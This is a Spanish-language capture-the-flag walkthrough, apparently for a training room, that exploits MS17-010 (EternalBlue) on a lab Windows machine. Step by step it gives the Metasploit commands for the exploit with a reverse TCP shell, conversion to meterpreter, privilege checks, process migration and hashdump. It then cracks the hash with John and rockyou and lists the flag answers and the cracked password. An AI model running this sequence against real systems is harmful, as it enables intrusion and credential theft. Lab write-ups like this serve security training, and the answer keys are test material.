# 1) Reconocimiento

## a) Escanee la máquina. (Si no está seguro de cómo abordar esto, le recomiendo que consulte la sala Nmap )

Escaneamos la maquina usando Nmap:

nmap -sV -T4 --script vuln -v 10.10.54.88

usando este comando veremos la version de los servicios (-sV) y las vulnerabilidades si las tuviera (--script vuln). El -v es "verbose" para que vaya diciendo lo que va haciendo, es opcional, pero ayuda a saber si está trabajando.

**Respuesta: No aplica.**

![](IMG/Pasted%20image%2020250225020513.png)

## b) ¿Cuántos puertos están abiertos con un número de puerto menor a 1000?

Hay 3 puertos abiertos que tengan un valor menor a 1000, los cuales son el 135, 445 y 139.

**Respuesta: 3**

![](IMG/Pasted%20image%2020250225020639.png)
## c) ¿A qué es vulnerable esta máquina? (Respuesta en forma de: ms??-???, ej: ms08-067)

Vemos que tiene una vulnerabilidad con el CVE-2017-0143, y el codigo de la vulnerabilidad es el ms17-010.

**Respuesta: ms17-010**

![](IMG/Pasted%20image%2020250225021134.png)


> [!NOTE]
> 
> Tambien podemos ver el codigo de vulnerabilidad en esta web: https://www.exploit-db.com/ buscando por el CVE.


![](IMG/Pasted%20image%2020250225021559.png)

# 2) Obtener Acceso

## a) Iniciar Metasploit

Iniciamos metasploit usando:

```
msfconsole
```

![](IMG/Pasted%20image%2020250225022257.png)

**Respuesta: No aplica.**

## b) Busque el código de explotación que ejecutaremos en la máquina. ¿Cuál es la ruta completa del código? (Ej.: exploit/........)

Una vez iniciado metasploit, buscaremos el exploit usando:

```
search ms17-010
```

![](IMG/Pasted%20image%2020250225022450.png)

En nuestro caso, probaremos con el primero, el cual tiene el número 0, por lo que para usarlo ejecutamos:

```
use 0
```

![](IMG/Pasted%20image%2020250225022723.png)

Una vez que lo tenemos en uso, debemos configurarlo, por lo que ejecutaremos:

```
options
```

![](IMG/Pasted%20image%2020250225023104.png)

Solo tendremos que aportar la información que es necesaria y no tenemos, en nuestro caso debemos introducir la IP del objetivo (RHOSTS), para ello usaremos:

```
set RHOSTS 10.10.54.88
```

![](IMG/Pasted%20image%2020250225023253.png)


> [!NOTE]
> Cuidado que aquí metiste el patazo gordo y no cambiaste la Ip de la maquina atacante, LHOSTS, se debe poner la ip que corresponda al interfaz tun0 ya que estamos en la VPN. Si no se cambia la ip no se consigue ejecutar correctamente el exploit. usamos set LHOST 10.8.16.0


![](IMG/Pasted%20image%2020250225030957.png)

La ruta al exploit la tenemos entre parentesis en el prompt.

**Respuesta: exploit/windows/smb/ms17_010_eternalblue**

## c) Mostrar opciones y establecer el valor requerido. ¿Cuál es el nombre de este valor? (En mayúsculas para enviar)

**Respuesta: RHOSTS**

## d) Por lo general, no habría ningún problema con ejecutar este exploit tal como está; sin embargo, para aprender, debe hacer una cosa más antes de explotar el objetivo. Ingrese el siguiente comando y presione Enter:

```
set payload windows/x64/shell/reverse_tcp
```

![](IMG/Pasted%20image%2020250225023838.png)

¡Una vez hecho esto, ejecuta el exploit!

Para ejecutar el exploit usamos:

```
run
```

![](IMG/Pasted%20image%2020250225024047.png)

Aunque nos devuelva algunos errores, dejamos que termine por si funcionara, pues estos errores son normales.

![](IMG/Pasted%20image%2020250225024211.png)

Finalmente conseguira ejecutar el exploit

![](IMG/Pasted%20image%2020250225032706.png)


> [!NOTE]
> Ha costado que ejecute el script, que no cunda el pánico, respira hondo y ejecutalo varias veces, reinicia la conexion VPN, sal y entra de metasploit, etc... cuando le de la gana funcionará.


**Respuesta: No aplica.**

## e) Confirme que el exploit se ha ejecutado correctamente. Es posible que tenga que pulsar Intro para que aparezca el shell DOS. Ejecute este shell en segundo plano (CTRL + Z). Si esto falla, es posible que tenga que reiniciar la máquina virtual de destino. Intente ejecutarlo de nuevo antes de reiniciar el destino.

Obtenemos una shell en la maquina objetivo:

![](IMG/Pasted%20image%2020250225032935.png)

Y la comprobamos probando a ejecutar un whoami:

![](IMG/Pasted%20image%2020250226022453.png)

**Respuesta: No aplica.**

# 3) Escalar privilegios

## a) Si aún no lo has hecho, pon en segundo plano el shell obtenido anteriormente (CTRL + Z). Busca en Internet cómo convertir un shell en un shell de meterpreter en metasploit. ¿Cuál es el nombre del módulo de publicación que usaremos? (La ruta exacta, similar al exploit que seleccionamos anteriormente)

Ponemos la shell en segundo plano, ejecutamos:

```
Control + Z
```

![](IMG/Pasted%20image%2020250225033036.png)

Ahora, cambiamos la shell a meterpreter y configuraremos sus opciones usando:

```
use post/multi/manage/shell_to_meterpreter
options
```

![](IMG/Pasted%20image%2020250225033257.png)

**Respuesta: post/multi/manage/shell_to_meterpreter**

## b) Seleccione esto (use MODULE_PATH). Mostrar opciones, ¿qué opción debemos cambiar?

**Respuesta: SESSION**


> [!NOTE]
> Hemos ejecutado ya esto en la captura anterior.

 
## c) Establezca la opción requerida, es posible que necesite enumerar todas las sesiones para encontrar su objetivo aquí. 

Vemos que debemos aportar el id de la sesión, para ello veremos las sesiones que tenemos iniciadas usando:

```
sessions
```

![](IMG/Pasted%20image%2020250225033425.png)

Como solo tenemos una, hay poco donde elegir, seleccionamos la sesión usando:

```
set session 1
```

![](IMG/Pasted%20image%2020250225033542.png)

también configuramos LHOST a tun0 (que ha dado problemas), usando:

```
set LHOST tun0
```

![](IMG/Pasted%20image%2020250225033724.png)

## d) ¡run! Si esto no funciona, intenta completar el exploit de la tarea anterior una vez más.

una vez configurado, lanzamos el exploit:

```
run
```

![](IMG/Pasted%20image%2020250225033830.png)

OJO que puede fallar y no crear la sesión 2, debe salirnos esto:

![](IMG/Pasted%20image%2020250225034122.png)

si no sale, repetir desde set session 1... hasta que salga.

## e) Una vez que se complete la conversión del shell de meterpreter, seleccione esa sesión para su uso.

Y ahora, iniciamos la sesión 2 que es la que acabamos de crear.

```
set session 2
sessions 2
```

![](IMG/Pasted%20image%2020250225034309.png)

## f) Verifique que hayamos escalado a NT AUTHORITY\SYSTEM. Ejecute getsystem para confirmarlo. No dude en abrir un shell de DOS mediante el comando 'shell' y ejecutar 'whoami'. Esto debería indicar que efectivamente somos system. Luego, vuelva a poner este shell en segundo plano y seleccione nuestra sesión meterpreter para usarla nuevamente.

Comprobamos que efectivamente todo funciona correctamente:

```
getsystem
shell
whoami
```

![](IMG/Pasted%20image%2020250225034523.png)

Para cambiar de la shell a meterpreter, usamos:

```
exit
```

**Respuesta: No aplica.**

## g) Enumere todos los procesos que se ejecutan mediante el comando 'ps'. El hecho de que seamos un sistema no significa que nuestro proceso lo sea. Busque un proceso hacia el final de esta lista que se esté ejecutando en NT AUTHORITY\SYSTEM y anote el ID del proceso (columna del extremo izquierdo).

Usamos en meterpreter:

```
ps
```

y usaremos, por ejemplo, el ultimo de los procesos:

![](IMG/Pasted%20image%2020250226030303.png)

En nuestro caso tiene el ID 3028

## h) Migre a este proceso utilizando el comando 'migrate PROCESS_ID', donde el ID del proceso es el que acaba de escribir en el paso anterior. Esto puede requerir varios intentos, ya que la migración de procesos no es muy estable. Si esto falla, es posible que deba volver a ejecutar el proceso de conversión o reiniciar la máquina y comenzar de nuevo. Si esto sucede, intente con un proceso diferente la próxima vez.

Para migrar al proceso que queremos (en nuestro caso, 3028) usamos:

```
migrate 3028
```

y nos ha dado error, así que usamos otro proceso, por ejemplo, el 3008:

![](IMG/Pasted%20image%2020250226030636.png)

**Respuesta: No aplica.**

# 4) Cracking

## a) Dentro de nuestro shell de meterpreter elevado, ejecute el comando 'hashdump'. Esto volcará todas las contraseñas en la máquina siempre que tengamos los privilegios correctos para hacerlo. ¿Cuál es el nombre del usuario no predeterminado?

Ejecutamos lo que nos dicen:

```
hashdump
```

y vemos todos los usuarios y sus contraseñas, el usuario no predeterminado es Jon.

![](IMG/Pasted%20image%2020250226030953.png)

**Respuesta: Jon**

## b) Copia este hash de contraseña en un archivo y busca cómo descifrarlo. ¿Cuál es la contraseña descifrada?

En una consola de nuestra maquina host, creamos un archivo con el hash a descifrar, hemos usado:

```
nano jon.txt
```

y hemos pegado el hash de la contraseña en su interior.

![](IMG/Pasted%20image%2020250226031431.png)

Ahora, hemos usado John the ripper y el diccionario Rockyou para intentar descifrarla, de esta forma:

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.txt
```

Y hemos metido la pata de nuevo, porque el archivo rockyou.txt no existe en la ruta:

![](IMG/Pasted%20image%2020250226032100.png)

y es porque lo tenemos comprimido, así que lo descomprimimos primero usando:

```
sudo gzip -d rockyou.txt.gz
```

![](IMG/Pasted%20image%2020250226032321.png)

Y lo intentamos de nuevo (ahora con exito):

![](IMG/Pasted%20image%2020250226032406.png)

**Respuesta: alqfna22**

# 5) Buscar banderas

## a) Bandera 1: Esta bandera se puede encontrar en la raíz del sistema.

Desde meterpreter (para poder usar comandos linux) entramos a la raiz del sistema, y veremos el archivo flag1.txt.

Sería así:

```
cd c:\\
ls
```

![](IMG/Pasted%20image%2020250225034523.png)

lo abrimos usando cat:

```
cat flag1.txt
```

![](IMG/Pasted%20image%2020250226132912.png)

**Respuesta: flag{access_the_machine}**

## b) Bandera 2: Esta bandera se puede encontrar en la ubicación donde se almacenan las contraseñas dentro de Windows.

Vamos a la ruta donde se almacenan las contraseñas de windows y listamos el directorio.

```
cd c:\\Windows\\system32\\config
ls
```

![](IMG/Pasted%20image%2020250226133224.png)

Encontraremos la segunda bandera.

![](IMG/Pasted%20image%2020250226133415.png)

la abrimos y tendremos la segunda flag.

```
cat flag2.txt
```

![](IMG/Pasted%20image%2020250226133506.png)

**Respuesta: flag{sam_database_elevated_access}**

## c) Bandera 3: Esta bandera se puede encontrar en un lugar excelente para saquear. Después de todo, los administradores suelen tener cosas bastante interesantes guardadas.

La flag estará en los documentos del usuario jon, así que buscamos la ubicación.

![](IMG/Pasted%20image%2020250226134110.png)
![](IMG/Pasted%20image%2020250226134138.png)
![](IMG/Pasted%20image%2020250226134203.png)

la abrimos y encontramos la ultima flag.

![](IMG/Pasted%20image%2020250226134246.png)

**Respuesta: flag{admin_documents_can_be_valuable}**
